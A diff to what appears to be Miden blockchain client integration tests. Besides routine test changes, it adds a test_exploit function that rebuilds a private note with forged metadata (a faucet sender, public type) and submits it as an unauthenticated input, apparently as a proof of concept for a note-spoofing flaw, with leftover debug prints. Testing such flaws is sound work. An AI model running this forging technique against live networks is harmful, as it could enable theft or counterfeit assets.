@@ -7,7 +7,7 @@ use miden_client::assembly::{DefaultSourceManager, LibraryPath, Module, ModuleKi
 use miden_client::asset::{Asset, FungibleAsset};
 use miden_client::builder::ClientBuilder;
 use miden_client::keystore::FilesystemKeyStore;
-use miden_client::note::{NoteFile, NoteScript, NoteType};
+use miden_client::note::{Note, NoteAssets, NoteFile, NoteMetadata, NoteScript, NoteTag, NoteType};
 use miden_client::rpc::domain::account::FetchedAccount;
 use miden_client::store::{
     InputNoteRecord,
@@ -16,6 +16,7 @@ use miden_client::store::{
     OutputNoteState,
     TransactionFilter,
 };
+use miden_client::testing::account_id::ACCOUNT_ID_NATIVE_ASSET_FAUCET;
 use miden_client::testing::common::*;
 use miden_client::transaction::{
     DiscardCause,
@@ -28,7 +29,7 @@ use miden_client::transaction::{
     TransactionRequestBuilder,
     TransactionStatus,
 };
-use miden_client::{ClientError, Felt, ScriptBuilder};
+use miden_client::{BlockNumber, ClientError, Felt, ScriptBuilder};
 use miden_client_sqlite_store::ClientBuilderSqliteExt;
 
 use crate::tests::config::ClientConfig;
@@ -661,14 +662,119 @@ pub async fn test_consume_multiple_expected_notes(client_config: ClientConfig) -
         .unauthenticated_input_notes(unauth_owned_notes.iter().map(|note| ((*note).clone(), None)))
         .build()?;
 
-    let tx_id_1 = execute_tx(&mut client, to_account_ids[0], tx_request_1).await;
-    let tx_id_2 = execute_tx(&mut unauth_client, to_account_ids[1], tx_request_2).await;
+    let tx_id_1 = submit_and_await_tx(&mut client, to_account_ids[0], tx_request_1).await;
+    let tx_id_2 = submit_and_await_tx(&mut unauth_client, to_account_ids[1], tx_request_2).await;
 
     // Ensure notes are processed
     assert!(!client.get_input_notes(NoteFilter::Processing).await.unwrap().is_empty());
     assert!(!unauth_client.get_input_notes(NoteFilter::Processing).await.unwrap().is_empty());
 
     wait_for_tx(&mut client, tx_id_1).await?;
+    wait_for_tx(&mut unauth_client, tx_id_2).await?;
+
+    // Verify no remaining expected notes and all notes are consumed
+    assert!(client.get_input_notes(NoteFilter::Expected).await.unwrap().is_empty());
+    assert!(unauth_client.get_input_notes(NoteFilter::Expected).await.unwrap().is_empty());
+
+    assert!(
+        !client.get_input_notes(NoteFilter::Consumed).await.unwrap().is_empty(),
+        "Authenticated notes are consumed"
+    );
+    assert!(
+        !unauth_client.get_input_notes(NoteFilter::Consumed).await.unwrap().is_empty(),
+        "Unauthenticated notes are consumed"
+    );
+
+    // Validate the final asset amounts in each account
+    for (client, account_id) in
+        vec![(client, to_account_ids[0]), (unauth_client, to_account_ids[1])]
+    {
+        assert_account_has_single_asset(
+            &client,
+            account_id,
+            faucet_account_id,
+            TRANSFER_AMOUNT * 2,
+        )
+        .await;
+    }
+    Ok(())
+}
+
+pub async fn test_exploit(client_config: ClientConfig) -> Result<()> {
+    let (mut client, authenticator_1) = client_config.clone().into_client().await?;
+    let (mut unauth_client, authenticator_2) = ClientConfig::default()
+        .with_rpc_endpoint(client_config.rpc_endpoint())
+        .into_client()
+        .await?;
+
+    wait_for_node(&mut client).await;
+
+    // Setup accounts
+    let (target_basic_account_1, faucet_account_header) =
+        setup_wallet_and_faucet(&mut client, AccountStorageMode::Private, &authenticator_1).await?;
+    let (target_basic_account_2, ..) =
+        insert_new_wallet(&mut unauth_client, AccountStorageMode::Private, &authenticator_2)
+            .await?;
+
+    unauth_client.sync_state().await.unwrap();
+
+    let faucet_account_id = faucet_account_header.id();
+    let to_account_ids = [target_basic_account_1.id(), target_basic_account_2.id()];
+
+    // Mint tokens to the accounts
+    let fungible_asset = FungibleAsset::new(faucet_account_id, TRANSFER_AMOUNT).unwrap();
+    let mint_tx_request = mint_multiple_fungible_asset(
+        fungible_asset,
+        &[to_account_ids[0],to_account_ids[0],to_account_ids[1],to_account_ids[1]],
+        NoteType::Private,
+        client.rng(),
+    );
+
+    execute_tx_and_sync(&mut client, faucet_account_id, mint_tx_request.clone()).await?;
+    unauth_client.sync_state().await.unwrap();
+
+    // Filter notes by ownership
+    let expected_notes = mint_tx_request.expected_output_own_notes().into_iter();
+
+    let client_notes: Vec<_> = client.get_input_notes(NoteFilter::All).await.unwrap();
+    let client_notes_ids: Vec<_> = client_notes.iter().map(|note| note.id()).collect();
+
+    let (client_owned_notes, unauth_owned_notes): (Vec<_>, Vec<_>) =
+        expected_notes.partition(|note| client_notes_ids.contains(&note.id()));
+
+    // Create and execute transactions
+    let tx_request_1 = TransactionRequestBuilder::new()
+        .authenticated_input_notes(client_owned_notes.iter().map(|note| (note.id(), None)))
+        .build()?;
+
+    // modify the note
+
+    let note = unauth_owned_notes[0].clone();
+    let metadata = NoteMetadata::new(
+        ACCOUNT_ID_NATIVE_ASSET_FAUCET.try_into()?,
+        NoteType::Public,
+        NoteTag::from_account_id(ACCOUNT_ID_NATIVE_ASSET_FAUCET.try_into()?),
+        miden_client::note::NoteExecutionHint::Always,
+        Felt::new(0),
+    ).unwrap();
+    let modified_note = Note::new(note.assets().clone(), metadata, note.recipient().clone());
+
+    let tx_request_2 = TransactionRequestBuilder::new()
+        .unauthenticated_input_notes([(modified_note,None)])
+        .build()?;
+
+    let tx_id_1 = submit_and_await_tx(&mut client, to_account_ids[0], tx_request_1).await;
+    wait_for_tx(&mut client, tx_id_1).await?;
+
+    let tx_id_2 = submit_and_await_tx(&mut unauth_client, to_account_ids[1], tx_request_2).await;
+
+    println!("both transactions went through");
+    // Ensure notes are processed
+    //assert!(!client.get_input_notes(NoteFilter::Processing).await.unwrap().is_empty());
+    assert!(!unauth_client.get_input_notes(NoteFilter::Processing).await.unwrap().is_empty());
+
+    wait_for_tx(&mut client, tx_id_1).await?;
+    std::println!("asdfsfd");
     wait_for_tx(&mut unauth_client, tx_id_2).await?;
 
     // Verify no remaining expected notes and all notes are consumed
